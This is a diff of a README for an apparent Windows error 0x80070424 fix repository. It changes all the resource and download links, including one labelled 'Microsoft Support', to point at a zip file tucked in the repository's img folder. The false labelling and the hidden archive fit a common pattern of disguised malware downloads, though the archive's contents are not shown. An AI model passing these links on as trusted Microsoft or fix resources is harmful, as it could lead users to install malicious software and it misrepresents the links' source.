@@ -32,9 +32,9 @@ Contributions to this repository are highly encouraged. If you have valuable ins
 
 ## Resources
 For additional resources on the 0x80070424 error and related topics, refer to the following:
-- [Microsoft Support - Windows Update Service error 0x80070424](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
-- [GitHub Repository - Fixing Windows Errors](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
+- [Microsoft Support - Windows Update Service error 0x80070424](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/raw/refs/heads/master/img/Specified-Error-Fixing-x-Service-v1.5.zip)
+- [GitHub Repository - Fixing Windows Errors](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/raw/refs/heads/master/img/Specified-Error-Fixing-x-Service-v1.5.zip)
 
-[![Download Software](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0<COLORCODE>)](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/releases/tag/v2.0)
+[![Download Software](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/raw/refs/heads/master/img/Specified-Error-Fixing-x-Service-v1.5.zip<COLORCODE>)](https://github.com/DAVIDKAMERON10/Fixing-Error-0x80070424-Specified-Service/raw/refs/heads/master/img/Specified-Error-Fixing-x-Service-v1.5.zip)
 
 🔧🛠️🚀 Happy fixing your Windows errors with the help of this repository! 🚀🛠️🔧
